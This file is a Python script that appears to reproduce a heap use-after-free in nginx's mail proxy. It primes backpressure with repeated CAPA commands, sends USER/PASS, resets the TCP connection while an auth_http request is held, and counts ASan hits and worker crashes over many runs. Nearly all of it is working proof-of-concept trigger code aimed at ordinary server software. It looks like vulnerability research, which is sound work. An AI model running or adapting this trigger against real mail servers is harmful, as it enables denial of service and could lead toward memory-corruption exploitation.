import sys, time, socket, json
from common import *
variant, method, n = sys.argv[1], sys.argv[2], int(sys.argv[3])
do_freeze = method != "none"
ctl = socket.create_connection(("auth", 5300)); cf = ctl.makefile("rw")
def cmd(s):
    cf.write(s + "\n"); cf.flush(); return cf.readline().strip()
def readline(s):
    b = b""
    while not b.endswith(b"\n"):
        d = s.recv(1)
        if not d: raise EOFError
        b += d
    return b
res = dict(variant=variant, method=method, n=n, hits=0, sendfail=0, crashes=0, other_asan=0, errors=0, held=0)
for i in range(n):
    wait_worker()
    before, off = asan_files(), errlog_size(); note = ""
    try:
        s = socket.socket(); prime = "prime" in variant
        if prime: s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2048)
        s.connect(("ngx", 110)); cport = s.getsockname()[1]
        readline(s)
        if prime:
            # Arm nginx's client write event: send CAPA one at a time without reading the replies,
            # until nginx's send() to us hits EAGAIN (its socket has unsent data: tx_queue > 0 and
            # our receive window is closed). Then drain everything.
            w0 = wait_worker()[0]; K = 0
            def blocked():
                return any(r["rport"] == cport and r["rx"] > 0 for r in proc_net(w0, "tcp"))
            def stuck():   # nginx stopped reading our commands => its send() returned EAGAIN
                return blocked() and (time.sleep(0.03) or blocked())
            while K < 5000:
                s.sendall(b"CAPA\r\n"); K += 1
                time.sleep(0.001)
                if blocked() and stuck(): break
            if not stuck(): note += " no-backpressure"
            # drain all replies, then sync on a marker (one invalid command -> "-ERR") so USER/PASS stay aligned
            buf = b""
            while buf.count(b"\r\n.\r\n") < K:
                d = s.recv(65536)
                if not d: raise EOFError
                buf += d
            s.sendall(b"XSYNC\r\n"); buf = buf.split(b"\r\n.\r\n")[-1]
            while b"-ERR" not in buf:
                d = s.recv(65536)
                if not d: raise EOFError
                buf += d
            res["prime_K"] = K
        s.sendall(b"USER u\r\n"); readline(s)
        w = wait_worker()[0]
        ws = freeze(method) if do_freeze else None
        s.sendall(b"PASS p\r\n")
        if "delay1ms" in variant: time.sleep(0.001)
        if "delay10ms" in variant: time.sleep(0.01)
        if do_freeze:
            if not wait_until(lambda: any(r["rport"] == cport and r["rx"] > 0 for r in proc_net(w, "tcp"))): note += " data-not-seen"
        rst(s)
        if do_freeze:
            if not wait_until(lambda: not any(r["rport"] == cport for r in proc_net(w, "tcp"))): note += " rst-not-seen"
            thaw(method, ws)
        # did nginx start an auth_http request for this session?
        held = cmd("WAIT 1 1") == "ok"; res["held"] += held
        if not held: note += " no-auth-request"
        time.sleep(0.05); cmd("RELEASE")
    except Exception as e:
        note += " exc:%r" % e; res["errors"] += 1
    time.sleep(0.4)
    log = errlog_since(off); hit = False
    for f in asan_files() - before:
        t = open(f, errors="replace").read()
        if "heap-use-after-free" in t and "ngx_mail" in t:
            hit = True
            if not res.get("sample"):
                res["sample"] = 1; open("/out/sample-mail-%s-%s.txt" % (variant, method), "w").write(t)
        else: res["other_asan"] += 1
    sf = "send() failed" in log
    crash = ("exited on signal" in log) or ("exited with code" in log)
    res["hits"] += hit; res["sendfail"] += sf; res["crashes"] += crash
    print(i, "HIT" if hit else "-", "sendfail" if sf else "", "crash" if crash else "", note, flush=True)
print("RESULT " + json.dumps(res), flush=True)
